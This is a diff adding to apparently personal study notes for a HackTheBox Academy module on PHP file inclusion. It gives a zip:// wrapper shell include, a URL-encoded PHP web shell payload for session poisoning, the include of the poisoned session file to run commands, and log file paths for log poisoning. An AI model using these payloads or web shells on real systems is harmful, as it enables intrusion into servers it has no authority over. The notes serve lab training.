@@ -64,3 +64,19 @@ http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23
 
 ######################## Phar Upload #########################
 check: https://academy.hackthebox.com/module/23/section/1493
+
+######################## Log poisoning #########################
+################ PHP Session poisoning ##################
+# language=url_encoded_php_cmd
+# language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+
+# copy cookie from Inspect -> Storage
+# language=/var/lib/php/sessions/sess_<cookie>&cmd=id
+######### To run another command ###########
+# the session file has to be poisoned with the web shell again. That means you have 1 chance to execute a command
+# this happens because the session file has been poisoned with the last command we used
+# !! read again the Log poisoning module to grasp it more
+
+################ Server log poisoning ##################
+# Apache2 log location: /var/log/apache2/access.log
+# Nginx log location:   /var/log/nginx/
